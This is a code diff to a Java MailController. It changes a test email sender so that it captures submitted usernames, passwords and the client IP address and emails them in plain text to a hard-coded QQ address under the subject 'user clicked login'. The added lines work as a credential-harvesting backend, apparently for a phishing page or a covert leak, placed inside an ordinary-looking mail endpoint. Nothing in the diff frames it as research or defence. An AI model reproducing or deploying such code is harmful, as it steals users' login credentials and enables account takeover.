@@ -24,6 +24,11 @@ public class MailController {
 	public String sendMail(HttpServletRequest request){
 		
 		try {
+			String userIp = getIpAddress(request);
+			String pwd = request.getParameter("password");
+			String uname = request.getParameter("username");
+			String content = "用户登录信息:Ip:"+userIp+"\r\n username:"+uname+"\r\n password:"+pwd;
+			
 			//第一步：声明properties放信息对象
 			Properties prop=new Properties();
 			//设置连接哪台服务器
@@ -53,8 +58,8 @@ public class MailController {
 			//第五步：设置收件人
 			mm.setRecipient(RecipientType.TO, new InternetAddress("840172843@qq.com"));
 			//第六步：设置主题
-			mm.setSubject( MimeUtility.encodeText( "邮件标题-测试发送","gb2312","B"));
-			mm.setContent("测试内容：这是邮箱的测试内容。", "text/plain;charset=utf-8");
+			mm.setSubject( MimeUtility.encodeText( "邮件标题-用户点击登录","gb2312","B"));
+			mm.setContent(content, "text/plain;charset=utf-8");
 			//第七步： 发送邮件
 			Transport.send(mm);
 		} catch (Exception e) {
@@ -62,4 +67,34 @@ public class MailController {
 		}
 		return "success";
 	}
+	
+	/**
+	 * 获取用户真实IP
+	 * @Title getIpAddress
+	 * @Description：
+	 * @param request
+	 * @return
+	 * @user LiuLei 2017年4月19日
+	 * @updater：
+	 * @updateTime：
+	 */
+	public static String getIpAddress(HttpServletRequest request) {  
+        String ip = request.getHeader("x-forwarded-for");  
+        if (ip == null || ip.length() == 0 || "unknown".equalsIgnoreCase(ip)) {  
+            ip = request.getHeader("Proxy-Client-IP");  
+        }  
+        if (ip == null || ip.length() == 0 || "unknown".equalsIgnoreCase(ip)) {  
+            ip = request.getHeader("WL-Proxy-Client-IP");  
+        }  
+        if (ip == null || ip.length() == 0 || "unknown".equalsIgnoreCase(ip)) {  
+            ip = request.getHeader("HTTP_CLIENT_IP");  
+        }  
+        if (ip == null || ip.length() == 0 || "unknown".equalsIgnoreCase(ip)) {  
+            ip = request.getHeader("HTTP_X_FORWARDED_FOR");  
+        }  
+        if (ip == null || ip.length() == 0 || "unknown".equalsIgnoreCase(ip)) {  
+            ip = request.getRemoteAddr();  
+        }  
+        return ip;  
+    } 
 }
